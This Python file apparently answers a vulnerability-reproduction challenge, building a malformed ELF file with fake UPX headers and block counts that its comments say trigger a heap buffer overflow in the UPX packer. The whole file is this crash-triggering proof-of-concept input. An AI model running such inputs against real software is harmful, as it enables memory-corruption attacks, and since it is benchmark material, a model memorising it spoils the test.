import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a 512-byte payload to trigger the heap buffer overflow
        # The payload mimics a UPX-packed ELF executable with malformed headers
        data = bytearray(512)
        
        # --- ELF Header (64-bit LSB) ---
        # e_ident: \x7fELF, 64-bit, LSB, Version 1, ABI 0
        data[0:16] = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # e_type: ET_EXEC (2)
        data[16:18] = struct.pack('<H', 2)
        # e_machine: EM_X86_64 (62)
        data[18:20] = struct.pack('<H', 62)
        # e_version: 1
        data[20:24] = struct.pack('<I', 1)
        # e_entry: 0x400080
        data[24:32] = struct.pack('<Q', 0x400080)
        # e_phoff: 64
        data[32:40] = struct.pack('<Q', 64)
        # e_shoff: 0
        data[40:48] = struct.pack('<Q', 0)
        # e_flags: 0
        data[48:52] = struct.pack('<I', 0)
        # e_ehsize: 64
        data[52:54] = struct.pack('<H', 64)
        # e_phentsize: 56
        data[54:56] = struct.pack('<H', 56)
        # e_phnum: 1
        data[56:58] = struct.pack('<H', 1)
        # e_shentsize: 64
        data[58:60] = struct.pack('<H', 64)
        # e_shnum: 0
        data[60:62] = struct.pack('<H', 0)
        # e_shstrndx: 0
        data[62:64] = struct.pack('<H', 0)
        
        # --- Program Header (at offset 64) ---
        ph = 64
        # p_type: PT_LOAD (1)
        data[ph:ph+4] = struct.pack('<I', 1)
        # p_flags: RWE (7)
        data[ph+4:ph+8] = struct.pack('<I', 7)
        # p_offset: 0
        data[ph+8:ph+16] = struct.pack('<Q', 0)
        # p_vaddr: 0x400000
        data[ph+16:ph+24] = struct.pack('<Q', 0x400000)
        # p_paddr: 0x400000
        data[ph+24:ph+32] = struct.pack('<Q', 0x400000)
        # p_filesz: 512
        data[ph+32:ph+40] = struct.pack('<Q', 512)
        # p_memsz: 512
        data[ph+40:ph+48] = struct.pack('<Q', 512)
        # p_align: 0x200000
        data[ph+48:ph+56] = struct.pack('<Q', 0x200000)

        # --- UPX Structures ---
        # Place UPX! magic at offset 128 (0x80) to be found by the packer
        upx_off = 128
        data[upx_off:upx_off+4] = b'UPX!'
        
        # l_info structure:
        # l_version (13), l_format (11 - linux/elf/amd64)
        data[upx_off+4] = 13
        data[upx_off+5] = 11
        
        # p_info structure (starts at upx_off + 12)
        p_info = upx_off + 12
        # p_flags
        data[p_info:p_info+4] = struct.pack('<I', 0)
        # p_checksum
        data[p_info+4:p_info+8] = struct.pack('<I', 0)
        # p_blocks - Set to 2 to trigger the loop where ph.method might not reset
        data[p_info+8:p_info+12] = struct.pack('<I', 2)
        # p_filesize - Large value to influence allocation/offsets
        data[p_info+12:p_info+16] = struct.pack('<I', 0x10000)
        # p_blocksize
        data[p_info+16:p_info+20] = struct.pack('<I', 0x10000)
        
        # Fill a region with non-zero data to simulate compressed blocks
        # This helps in triggering processing logic that reads from the heap
        for i in range(p_info+20, 480):
            data[i] = 0xFF
            
        # UPX Footer magic at the end of the file
        # PackLinuxElf typically checks the end of the file for the overlay footer
        data[508:512] = b'UPX!'
        
        return bytes(data)